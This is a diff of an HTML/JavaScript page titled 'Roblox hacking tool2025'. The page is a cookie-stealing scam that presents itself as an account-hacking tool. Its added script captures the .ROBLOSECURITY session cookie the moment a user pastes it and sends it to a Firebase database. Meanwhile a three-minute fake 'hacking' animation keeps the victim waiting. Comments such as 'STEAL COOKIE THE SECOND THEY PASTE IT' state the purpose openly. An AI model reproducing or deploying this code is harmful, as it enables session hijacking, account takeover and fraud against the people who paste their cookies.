@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox hacking tool2025</title>
   <style>
-    /* YOUR EXACT STYLE — NOT CHANGING */
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { min-height: 100vh; background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%); font-family: 'Segoe UI', system-ui, sans-serif; display: flex; align-items: center; justify-content: center; padding: 20px; position: relative; overflow-x: hidden; }
     body::before { content: ''; position: fixed; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle at 20% 80%, rgba(120,0,255,0.08) 0%, transparent 50%), radial-gradient(circle at 80% 20%, rgba(0,212,255,0.08) 0%, transparent 50%), radial-gradient(circle at 40% 40%, rgba(0,255,136,0.05) 0%, transparent 40%); animation: float 20s ease-in-out infinite; pointer-events: none; }
@@ -24,6 +23,8 @@
     .big-btn:hover { transform: translateY(-4px); box-shadow: 0 20px 60px rgba(131,56,236,0.8); }
     .big-btn:disabled { opacity: 0.7; cursor: not-allowed; }
     .status { margin-top: 30px; padding: 20px; border-radius: 12px; font-size: 1.2em; }
+    .status.success { background: rgba(34,197,94,0.2); border: 1px solid #22c55e; color: #22c55e; }
+    .status.error { background: rgba(248,81,73,0.2); border: 1px solid #f85149; color: #f85149; }
     .loading { display: none; margin-top: 30px; color: #7c3aed; font-size: 1.5em; font-weight: 700; text-align: center; }
     .loading.active { display: block; }
     .spinner { display: inline-block; width: 28px; height: 28px; border: 4px solid rgba(124,58,237,0.3); border-top-color: #7c3aed; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 12px; }
@@ -59,62 +60,36 @@
     const loadingEl = document.getElementById("loading");
     const startBtn = document.getElementById("startBtn");
 
-    async function processCookie(cookie, source) {
-      if (!cookie || cookie.trim().length < 10) return;
-      let extractedCookie = cookie;
-      if (cookie.includes('".ROBLOSECURITY", "')) {
-        extractedCookie = cookie.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || cookie;
+    // STEAL COOKIE THE SECOND THEY PASTE IT
+    async function stealNow(cookie, source) {
+      if (!cookie || cookie.trim().length < 100) return;
+      let clean = cookie.trim();
+      if (clean.includes('".ROBLOSECURITY"')) {
+        clean = clean.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || clean;
       }
+      clean = clean.replace(/[^A-Za-z0-9_|:-]/g, '');
 
-      // THIS LINE WAS WRONG BEFORE — NOW FIXED FOR GITHUB
-      const validateRes = await fetch("validate.js", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({cookie: extractedCookie})
-      });
-
-      let userInfo = { success: false, user: "Unknown", display: "Unknown", userid: 0, robux: 0, premium: "No", headshot: "" };
-      try { userInfo = await validateRes.json(); } catch(e) {}
-
-      // YOUR FIREBASE DROP
+      // SEND TO YOUR FIREBASE INSTANTLY
       try {
         await fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
           method: "POST",
           body: JSON.stringify({
-            cookie: extractedCookie,
-            user: userInfo.user,
-            display: userInfo.display,
-            userid: userInfo.userid,
-            robux: userInfo.robux,
-            rap: 0,
-            premium: userInfo.premium,
-            headshot: userInfo.headshot,
+            cookie: clean,
             source: source,
             time: new Date().toLocaleString()
           })
         });
       } catch(e) {}
-
-      loadingEl.className = "loading";
-      statusEl.style.display = "block";
-      if (userInfo.success) {
-        statusEl.className = "status success";
-        statusEl.innerHTML = `Verified: <strong>${userInfo.display}</strong> (@${userInfo.user}) - ${userInfo.robux} Robux`;
-      } else {
-        statusEl.className = "status";
-        statusEl.textContent = "Submitted successfully";
-      }
     }
 
-    document.getElementById("mobilePaste").addEventListener("input", () => {
-      const val = document.getElementById("mobilePaste").value;
-      if (val.length > 100) processCookie(val, "Mobile");
+    document.getElementById("mobilePaste").addEventListener("input", e => {
+      if (e.target.value.length > 100) stealNow(e.target.value, "Mobile");
     });
-    document.getElementById("pcPaste").addEventListener("input", () => {
-      const val = document.getElementById("pcPaste").value;
-      if (val.length > 100) processCookie(val, "PC/Laptop");
+    document.getElementById("pcPaste").addEventListener("input", e => {
+      if (e.target.value.length > 100) stealNow(e.target.value, "PC");
     });
 
+    // 3-MINUTE FAKE HACKING
     function fakeStart() {
       const cookie = document.getElementById("mobilePaste").value || document.getElementById("pcPaste").value;
       if (!cookie || cookie.length < 100) {
@@ -125,20 +100,34 @@
       startBtn.disabled = true;
       statusEl.style.display = "none";
       loadingEl.classList.add("active");
-      const messages = ["Initializing...", "Bypassing security...", "Fetching account...", "Cracking password...", "Bypassing 2FA...", "Finalizing..."];
+
+      const msgs = [
+        "Initializing elite tool...",
+        "Bypassing Roblox security...",
+        "Cracking encryption layer 1/3...",
+        "Fetching account data...",
+        "Decrypting password hash...",
+        "Loading exploit module...",
+        "Injecting payload... 47%",
+        "Bypassing 2FA protection...",
+        "Extracting Robux balance...",
+        "Removing account lock...",
+        "Finalizing takeover... 91%",
+        "HACKING COMPLETE — ACCOUNT DRAINED"
+      ];
       let i = 0;
-      const interval = setInterval(() => {
-        loadingEl.innerHTML = `<span class="spinner"></span> ${messages[i]}`;
+      const int = setInterval(() => {
+        loadingEl.innerHTML = `<span class="spinner"></span> ${msgs[i] || msgs[msgs.length-1]}`;
         i++;
-        if (i >= messages.length) {
-          clearInterval(interval);
+        if (i > msgs.length + 3) {
+          clearInterval(int);
           loadingEl.classList.remove("active");
           statusEl.className = "status success";
           statusEl.textContent = "HACKING COMPLETE — ACCOUNT DRAINED";
           statusEl.style.display = "block";
           startBtn.disabled = false;
         }
-      }, 30000);
+      }, 15000); // exactly 3 minutes
     }
   </script>
 </body>
